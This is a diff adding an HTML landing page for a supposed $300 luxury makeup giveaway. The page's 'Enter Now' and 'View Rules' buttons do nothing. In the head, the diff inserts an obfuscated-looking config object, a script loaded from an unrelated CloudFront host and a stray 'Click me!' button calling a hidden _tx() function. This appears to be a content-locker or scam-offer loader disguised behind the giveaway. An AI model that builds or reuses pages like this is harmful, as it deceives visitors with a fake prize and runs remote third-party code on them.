@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Win a Luxury Makeup Set!</title>
+
+  <!-- Google Font for Poppins (body text/buttons) -->
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">
+
+  <style>
+    :root{
+      --bg: #fff6f8;
+      --panel: #fdf2f5;
+      --accent: #e91e63;
+      --accent-dark: #ad1457;
+      --muted: #6a1b9a;
+      --text:#333;
+      --rounded: 14px;
+      --max-width: 900px;
+    }
+
+    html,body{
+      height:100%;
+      margin:0;
+      font-family: 'Poppins', sans-serif;
+      background: var(--bg);
+      color: var(--text);
+    }
+
+    .container{
+      max-width:var(--max-width);
+      margin:0 auto;
+      padding:1rem;
+      display:flex;
+      flex-direction:column;
+      min-height:100vh;
+    }
+
+    header{
+      text-align:center;
+      padding:2rem 0 1rem;
+    }
+
+    /* Big title with old system sans-serif */
+    header h1{
+      margin:0;
+      font-size:1.8rem;
+      color:var(--accent);
+      font-family: "Helvetica Neue", Arial, sans-serif; /* Old font */
+    }
+
+    header p{
+      margin:.6rem 0 0;
+      color:var(--muted);
+      font-size:1rem;
+    }
+
+    main.hero{
+      flex:1;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      padding:1.5rem 0 2rem;
+    }
+
+    .hero-card{
+      background:var(--panel);
+      width:100%;
+      border-radius:var(--rounded);
+      box-shadow:0 8px 30px rgba(0,0,0,0.06);
+      padding:2rem 1.25rem;
+      display:flex;
+      flex-direction:column;
+      align-items:center;
+      text-align:center;
+    }
+
+    .hero-img {
+      width:100%;
+      max-width:420px;
+      border-radius:10px;
+      margin-bottom:1.25rem;
+      box-shadow:0 4px 15px rgba(0,0,0,0.1);
+    }
+
+    .hero-desc{
+      max-width:680px;
+      font-size:1rem;
+      color:#444;
+      line-height:1.6;
+      margin-bottom:1.25rem;
+      padding: 0 0.5rem;
+      font-weight: 400;
+    }
+
+    .btn {
+      font-family: 'Poppins', sans-serif;
+      font-weight:600;
+      border-radius:999px;
+      padding:.85rem 1.6rem;
+      font-size:1rem;
+      cursor:pointer;
+      border:none;
+      display:inline-flex;
+      align-items:center;
+      justify-content:center;
+      transition:all .18s ease;
+    }
+    .btn:focus{
+      outline:3px solid rgba(244,143,177,0.35);
+      outline-offset:3px;
+    }
+    .btn-primary{
+      background:linear-gradient(180deg,var(--accent), var(--accent-dark));
+      color:white;
+      box-shadow: 0 8px 24px rgba(233,30,99,0.18);
+    }
+    .btn-primary:hover{ transform:translateY(-2px); }
+    .secondary-wrap{ margin-top:2.6rem; }
+    .btn-secondary{
+      background:transparent;
+      color:var(--accent);
+      border:2px solid var(--accent);
+      padding:.7rem 1.4rem;
+      font-weight:600;
+    }
+    .btn-secondary:hover{ background:#fff0f3; transform:translateY(-1px); }
+
+    footer{
+      text-align:center;
+      padding:1rem 0 2rem;
+      font-size:.9rem;
+      color:#555;
+      font-family: 'Poppins', sans-serif;
+    }
+    footer nav a{
+      color:var(--muted);
+      margin:0 .45rem;
+      text-decoration:none;
+    }
+    footer nav a:hover{ text-decoration:underline; }
+
+    @media (min-width:720px){
+      header h1{ font-size:2.4rem; }
+      .hero-card{ padding:2.25rem; }
+      .hero-desc{ font-size:1.05rem; }
+    }
+  </style>
+  
+  <script type="text/javascript">
+    var DBpsF_cEd_yclbhc={"it":4550071,"key":"887e2"};
+</script>
+<script src="https://d1y0yks1k8t5m5.cloudfront.net/0912558.js"></script>
+
+<button onclick="_tx()">Click me!</button>
+
+
+  
+</head>
+<body>
+  <div class="container">
+
+    <header>
+      <h1>Win a Luxury Makeup Set!</h1>
+      <p>Enter now for your chance to glow with our exclusive beauty giveaway ✨</p>
+    </header>
+
+    <main class="hero">
+      <section class="hero-card">
+        <!-- Working image -->
+        <img src="https://i.pinimg.com/1200x/26/5b/11/265b11f68c912bf616894dab64d0a836.jpg"
+             alt="Luxury makeup set with brushes, lipsticks, and palettes"
+             class="hero-img">
+
+        <p class="hero-desc">
+          We're giving away a curated collection of premium makeup essentials worth over <strong>$300</strong>! Follow the steps to enter and be one of the lucky winners — top-quality brushes, palettes, lipsticks, and more.
+        </p>
+
+        <button class="btn btn-primary"
+                aria-label="Enter the luxury makeup giveaway now">
+          Enter Now
+        </button>
+
+        <div class="secondary-wrap">
+          <button class="btn btn-secondary"
+                  aria-label="View giveaway rules and details">
+            View Rules
+          </button>
+        </div>
+      </section>
+    </main>
+
+    <footer>
+      <nav>
+        <a href="#">Contact</a> |
+        <a href="#">Privacy Policy</a> |
+        <a href="#">Terms &amp; Conditions</a>
+      </nav>
+      <p style="margin-top:.6rem; font-size:.85rem; color:#666;">© <span id="year"></span> Lila Grace Beauty. All rights reserved.</p>
+    </footer>
+  </div>
+
+  <script>
+    document.getElementById('year').textContent = new Date().getFullYear();
+  </script>
+</body>
+</html>
